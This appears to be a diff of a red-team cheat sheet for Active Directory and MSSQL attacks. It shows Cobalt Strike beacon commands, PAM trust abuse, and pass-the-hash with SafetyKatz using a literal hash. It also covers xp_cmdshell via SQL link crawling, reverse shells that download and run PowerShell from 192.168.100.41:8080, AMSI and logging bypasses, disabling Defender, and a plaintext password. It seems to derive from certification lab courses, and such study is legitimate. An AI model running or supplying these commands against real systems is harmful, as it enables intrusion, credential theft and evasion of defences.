-beacon> shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
-beacon> Get-DecryptedCpassword
+# PAM Trust is enabled between red/bastion forest and Production Forest using Shadow credentials. These credentials are created in Basion domain and mapped with DA/EA group of production forest
 
-# Find accessible share having juicy information
-beacon> powerpick Find-DomainShare -CheckShareAccess
-beacon> powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
-beacon> powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5
+# Check for Foreign Security Pricipal (Group/User) in Target Forest (bastion) from techcorp.local
+Get-ADTrust -Filter * 
+Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
+Get-DomainObject -domain bastion.local | ?{$_.objectclass -match "foreignSecurityPrincipal"} 
 
-# Search for senstive data in directly accessible DB by keywords
-beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize
+# Gain Access to Basion-DC (use ntlm auth)
+ .\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:bastion.local /dc:bastion-dc.bastion.local /rc4:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"
 
-# Search for senstive data in DB links
-beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
+# On basion-dc, enumerate if there is a PAM trust by validating below 2 conditions for given trust
+Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
+Get-DomainTrust
 
-beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"
+# It can also be verified by presence of shadow pricipal conatiner
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter *  -Properties *| select Name,member,msDS-ShadowPrincipalSid
 
-beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
-```
+Get-DomainObject -Searchbase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local"
 
+# Find the IP address of production-dc using DNS Query or Ping command
+Get-DNSServerZone -Zonename production.local | fl *
 
-```
-# Not able to migrate to another process using Inject Command (worked by choosing P2P beacon)
+# Enable Trusted Host configuration for WinRM from Admin shell
+Set-Item WSMan:\localhost\Client\TrustedHosts *
 
-# Was facing some issues with doing the lateral movement by SYSTEM User
-- But if we have access to NTLM hash, we can directly use PTH and JUMP to move laterally 
-- Still Powerview functions don't work in this context, need to find a way
+# Connect with remote system
+Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
 
 ```
 
-## Reference:
 
-https://training.zeropointsecurity.co.uk/courses/red-team-ops
+#### MSSQL DB Attacks
+
+```powershell
+# Import PowerUpSql
+Import-Module .\PowerupSQL-master\PowerupSQL.psd1
+iex (iwr https://192.168.100.X/PowerUpSQL.ps1 -UseBasicParsing)
+
+# Scan for MSSQL DB Installation by SPN Search
+Get-SQLInstanceDomain
+Get-SQLInstanceDomain -Instance dcorp-mssql.organicsecurity.local
+
+# Check if the current logged-on user has access to SQL Database
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | SQLConnectionTestThreaded
+
+# Gather more info about identified db
+Get-SQLInstanceDomain | Get-SQLServerInfo
+
+# Scan for MSSQL misconfigurations to escalate to SA  
+Invoke-SQLAudit -Verbose -Instance TARGETSERVER
+
+# Execute SQL query  
+Get-SQLQuery -Query "SELECT system_user" -Instance TARGETSERVER
+
+# Check for presence of DB Link
+Get-SQLServerLink -Instance dcorp-mssql.organicsecurity.local
+
+# Crawl the DB Link to enecute command, choose specific system via QueryTarget parameter
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local 
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query "exec master..xp_cmdshell 'whoami'"
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget db-sqlsrv
+
+# Take reverse shell from DB
+Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1'')"' -QueryTarget db-sqlsrv | select instance,links,customquery | ft
+
+# Take reverse shell from DB (BypassLogging & AV detection)
+Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell ''powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv | select instance,links,customquery | ft
+
+Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell ''powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv 
+
+# Run command (enables XP_CMDSHELL automatically if required)  
+Invoke-SQLOSCmd -Instance TARGETSERVER -Command "whoami" | select -ExpandProperty CommandResults
+
+# Enable rpc and rpcout on DB-SQLSRV (may require to run it twice)
+Invoke-SQLCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
+
+# DB Query to enable XP_CMDSHELL
+Invoke-SQLCmd -Query "EXECUTE('sp_configure ''show advanced options'', 1; reconfigure') AT ""db-sqlsrv"""
+Invoke-SQLCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure') AT ""db-sqlsrv"""
+
+# Use specific credentials to query db
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+# Check for Impersonation attack
+Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit
+
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
+
+# Impersonate user and execute db query
+Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin';  select system_user" -Instance sqldb.organicsecurity.local
+
+Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin'; EXECUTE AS LOGIN = 'sa';  select system_user" -Instance sqldb.organicsecurity.local
+
+# Execute OS level command by impersonating the user
+Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin';  EXECUTE AS LOGIN = 'sa'; exec master..xp_cmdshell 'powershell -c ''Set-MpPreference -DisableRealtimeMonitoring $true'''" -Instance sqldb.organicsecurity.local
+
+```
+
+
+#### Reference:
+https://github.com/0xJs/CRTE-Cheatsheet/blob/main/README.md
+https://www.alteredsecurity.com/redteamlab
